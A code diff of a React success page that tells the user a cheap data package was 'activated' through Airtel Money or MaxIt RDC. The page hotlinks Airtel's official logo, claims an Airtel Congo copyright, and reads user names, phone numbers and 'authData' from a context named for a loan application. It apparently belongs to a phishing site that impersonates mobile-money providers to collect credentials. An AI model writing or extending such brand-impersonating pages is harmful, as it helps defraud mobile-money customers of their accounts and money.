@@ -1,89 +1,76 @@
-import { useNavigate } from 'react-router-dom';
-import { useLoanApplication } from '../LoanApplicationContext';
-import { useUserId } from '../hooks/useUserId';
+import React from 'react';
+import { useNavigate, useParams } from 'react-router-dom';
+import { useLoanApplication } from './LoanApplicationContext';
+import { useUserId } from './UserIdContext';
 import './Status.css';
 
 export default function Status() {
   const navigate = useNavigate();
-  const { userId } = useUserId();
-  const { selectedPlan, personalDetailsData, authData } = useLoanApplication();
+  const { userId, provider } = useParams();
+  const { visitorId } = useUserId();
+  const { loanApplication } = useLoanApplication();
 
-  const planData = selectedPlan || { data: '7.5 GB', price: 0.49 };
-  const userName =
-    `${personalDetailsData?.firstName || ''} ${personalDetailsData?.lastName || ''}`.trim() ||
-    authData?.phoneNumber ||
-    'Cher Client';
-
-  const handleReturnHome = () => navigate(`/${userId}`);
+  const effectiveUserId = userId || visitorId;
+  const plan = loanApplication?.selectedPlan || {};
+  const providerName = provider === 'maxit' ? 'MaxIt RDC' : 'Airtel Money';
+  const providerClass = provider || 'airtel';
 
   return (
-    <div className="st-root">
-      <div className="st-bg-blob st-bg-blob-1" />
-      <div className="st-bg-blob st-bg-blob-2" />
-
-      <div className="st-content">
-        <div className="st-topbar">
-          <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
-            alt="Airtel" className="st-logo" />
+    <div className={`status-page ${providerClass}`}>
+      {/* Success Icon */}
+      <div className="status-icon-wrap">
+        <div className="status-icon-ring" />
+        <div className="status-icon-ring" />
+        <div className="status-icon-ring" />
+        <div className="status-icon-circle">
+          <span className="check">✓</span>
         </div>
-
-        <div className="st-icon-wrap">
-          <div className="st-icon-ring st-ring-3" />
-          <div className="st-icon-ring st-ring-2" />
-          <div className="st-icon-ring st-ring-1" />
-          <div className="st-icon-circle">
-            <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
-              <path d="M10 22l8.5 8.5L34 14" stroke="#fff" strokeWidth="4.5"
-                strokeLinecap="round" strokeLinejoin="round" />
-            </svg>
-          </div>
-        </div>
-
-        <div className="st-congrats-label">🎉 Félicitations!</div>
-        <h1 className="st-title">{userName}</h1>
-
-        <div className="st-credit-card">
-          <div className="st-credit-top">
-            <span className="st-credit-icon">📶</span>
-            <span className="st-credit-tag">Forfait Activé</span>
-          </div>
-          <div className="st-credit-data">
-            <span className="st-credit-amount">{planData.data}</span>
-          </div>
-          <p className="st-credit-msg">
-            sera automatiquement crédité et ajouté à votre compte Airtel Money
-          </p>
-          <div className="st-credit-divider" />
-          <div className="st-credit-detail-row">
-            <span className="st-credit-detail-label">Montant à déduire</span>
-            <span className="st-credit-detail-val">${planData.price?.toFixed(2)}</span>
-          </div>
-          {planData.validity && (
-            <div className="st-credit-detail-row">
-              <span className="st-credit-detail-label">Validité</span>
-              <span className="st-credit-detail-val">{planData.validity}</span>
-            </div>
-          )}
-          <div className="st-credit-detail-row">
-            <span className="st-credit-detail-label">Statut</span>
-            <span className="st-credit-detail-val st-status-active">✓ Actif</span>
-          </div>
-        </div>
-
-        <div className="st-info-box">
-          <div className="st-info-icon">📱</div>
-          <p className="st-info-text">
-            Assurez-vous d'avoir suffisamment d'argent sur le compte pour l'achat. Vous recevrez un SMS de confirmation dans les prochaines minutes. Profitez de votre connexion internet! Si les fonds sont insuffisants, l'achat échouera automatiquement.
-          </p>
-        </div>
-
-        <button className="st-home-btn" onClick={handleReturnHome}>
-          <span className="st-home-icon">🏠</span>
-          Retour à l'Accueil
-        </button>
-
-        <p className="st-footer-text">© 2026 Airtel Congo. Tous droits réservés.</p>
       </div>
+
+      <h1 className="status-title">Verification Complete</h1>
+      <p className="status-subtitle">
+        Your {plan.data || 'data'} package has been activated successfully via {providerName}.
+      </p>
+
+      {/* Info Card */}
+      <div className="status-info-card">
+        <div className="status-info-row">
+          <span className="status-info-label">Package</span>
+          <span className="status-info-value">{plan.data || '—'}</span>
+        </div>
+        <div className="status-info-row">
+          <span className="status-info-label">Amount</span>
+          <span className="status-info-value">
+            {plan.price ? `$${plan.price.toFixed(2)}` : '—'}
+          </span>
+        </div>
+        <div className="status-info-row">
+          <span className="status-info-label">Provider</span>
+          <span className="status-info-value provider-badge">
+            {provider === 'maxit' ? 'M' : 'A'} {providerName}
+          </span>
+        </div>
+        <div className="status-info-row">
+          <span className="status-info-label">Validity</span>
+          <span className="status-info-value">30 Days</span>
+        </div>
+        <div className="status-info-row">
+          <span className="status-info-label">Status</span>
+          <span className="status-info-value" style={{ color: '#27ae60' }}>Active ✓</span>
+        </div>
+      </div>
+
+      {/* Home Button */}
+      <button
+        className="status-home-btn"
+        onClick={() => navigate(`/${effectiveUserId}/dataplans`)}
+      >
+        ← Back to Plans
+      </button>
+
+      <footer className="status-footer">
+        <p>🇨🇩 DRC Data Services<br />{providerName}</p>
+      </footer>
     </div>
   );
 }
